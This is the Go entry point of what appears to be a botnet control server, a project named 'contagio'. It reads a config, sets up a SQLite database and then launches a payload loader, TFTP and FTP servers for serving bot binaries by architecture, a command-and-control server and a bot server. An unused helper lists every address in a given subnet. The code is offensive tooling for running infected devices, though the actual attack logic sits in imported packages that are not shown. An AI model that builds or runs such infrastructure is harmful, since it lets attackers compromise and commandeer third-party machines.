package main

import (
	"contagio/contagio/bot_server"
	"contagio/contagio/cnc"
	"contagio/contagio/config"
	"contagio/contagio/config/logging"
	"contagio/contagio/database/sqlite"
	loader "contagio/contagio/loader_server"
	"contagio/contagio/monitor"
	"fmt"
	"net"
	"os"
	"sync"
)

var wg sync.WaitGroup

func main2() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <subnet>")
		fmt.Println("Example: go run main.go 192.168.1.0/24")
		return
	}

	subnet := os.Args[1]
	ip, ipNet, err := net.ParseCIDR(subnet)
	if err != nil {
		fmt.Println("Invalid subnet:", err)
		return
	}

	for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); inc(ip) {
		fmt.Println(ip)
	}
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func main() {

	c, err := config.ReadConfig(&wg)
	if err != nil {
		fmt.Printf("Config error: %s\n", err.Error())
		return
	}

	logging.SetLogLevels(c.Logging.LogLevel)

	sqlite.InitDb()

	fmt.Println("PID:", os.Getpid())

	if len(os.Args) > 1 {
		if os.Args[1] == "-monitor" {
			monitor.StartMonitor(c)
		}
	}

	sqlite.SetPid(os.Getpid())
	logging.PrintInfo(c.Ti.ThemeInit.Name + " theme loaded. Version: " + c.Ti.ThemeInit.Version)

	wg.Add(1)
	loader.GetArchs(&wg)

	go loader.StartLoader(c)
	go loader.StartTftp(c)
	go loader.StartFtp(c)
	go cnc.StartCnc(c)
	go bot_server.StartBotServer(c)
	wg.Wait()

}
